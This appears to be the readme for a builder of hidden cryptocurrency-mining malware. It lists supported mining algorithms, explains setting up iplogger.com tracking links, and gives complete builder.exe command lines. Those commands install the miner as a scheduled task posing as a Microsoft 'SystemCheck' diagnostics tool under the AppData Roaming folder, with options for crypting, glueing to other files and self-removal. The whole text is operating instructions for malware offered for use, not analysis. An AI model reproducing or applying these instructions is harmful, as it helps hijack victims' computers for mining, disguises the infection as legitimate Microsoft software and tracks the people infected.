Algo - can be left blank. It will default on Monero autodetect.
cn/upx2         CryptoNight-Femto (variant of CryptoNight V2 for Uplexa).	
argon2/chukwav2	Argon2id (Chukwa v2).	CPU only
cn/ccx          Conceal (CCX)	
kawpow          KawPow (Ravencoin)	GPU only, not supported by xmrig-proxy
rx/keva         RandomKEVA (RandomX variant for Keva).	
astrobw         AstroBWT (Dero).
astrobwt/v2     AstroBWT (Dero HE).	
cn-pico/tlo     CryptoNight-Pico (Talleo).	
rx/sfx          RandomSFX (RandomX variant for Safex).	
rx/arq          RandomARQ (RandomX variant for ArQmA).	
rx/0            RandomX (Monero).	
argon2/chukwa   Argon2id (Chukwa).	CPU only
argon2/ninja    Argon2id (NINJA)	CPU only
rx/wow          RandomWOW (RandomX variant for Wownero).	
cn/fast         CryptoNight variant 1 with half iterations.	
cn/rwz          CryptoNight variant 2 with 3/4 iterations and reversed shuffle operation.	
cn/zls          CryptoNight variant 2 with 3/4 iterations.	
cn/double       CryptoNight variant 2 with double iterations.	
cn/r            CryptoNightR (Monero's variant 4).	
cn-pico         CryptoNight-Pico.	
cn/half         CryptoNight variant 2 with half iterations.	
cn/2            CryptoNight variant 2.	
cn/xao          CryptoNight variant 0 (modified).	
cn/rto          CryptoNight variant 1 (modified).	
cn-heavy/tube   CryptoNight-Heavy (modified).	
cn-heavy/xhv    CryptoNight-Heavy (modified).	
cn-heavy/0      CryptoNight-Heavy.	
cn/1            CryptoNight variant 1.	
cn-lite/1       CryptoNight-Lite variant 1.	
cn-lite/0       CryptoNight-Lite variant 0.	
cn/0            CryptoNight (original).
gr              GhostRider (Raptoreum).

Loggers.
We create an "invisible image" on https://iplogger.com/, get the address "https://2no.co/16Sxt7", 
copy "16Sxt7" and paste it into the desired logger.

del.bat - to remove the installed build.

===================================================================

Works through the console. Open cmd.exe, drag builder.exe into it and write parameters for build build via space.
Example:

builder.exe -algo'' -pool'stratum+tcp://pool.com:3333' -wallet'123' -load'50' -idleload'50' -loggerSa'2no.co' -loggerS'' -loggerRa'2no.co' -loggerR'' -loggerWa'2no.co' -loggerW'' -ico'' -glue'' -error'' -worker'' -icrypt'' -sremoval'' -ntask'SystemCheck' -ptask'System\' -atask'Microsoft_Corporation' -dtask'Starts_a_system_diagnostics_application_to_scan_for_errors_and_performance_problems.' -pinstall'Roaming\Microsoft\Windows\' -ninstall'Helper' -sinstall'-SystemCheck'

or

builder.exe -algo'' -pool'stratum+tcp://pool.com:3333' -wallet'123' -load'50' -idleload'100' -loggerSa'2no.co' -loggerS'1dajJD' -loggerRa'2no.co' -loggerR'2dajJD' -loggerWa'2no.co' -loggerW'3dajJD' -ico'name' -glue'name' -error'1' -worker'1' -icrypt'1' -sremoval'1' -ntask'SystemCheck' -ptask'System\' -atask'Microsoft_Corporation' -dtask'Starts_a_system_diagnostics_application_to_scan_for_errors_and_performance_problems.' -pinstall'Roaming\Microsoft\Windows\' -ninstall'Helper' -sinstall'-SystemCheck'

-worker'' - no worker name
-worker'1' - the name of the worker will be a dot after the wallet (-u wallet.NAME)
-worker'2' - the name of the worker will be in the password (-p xNAME)

*Instead of a spac "_" (underscore) is used. In options such as "Task Description".

===================================================================

* If you have a low mining speed, then most likely you are mining on the cryptonight algorithm on the pool and you need to force the RandomX algorithm then.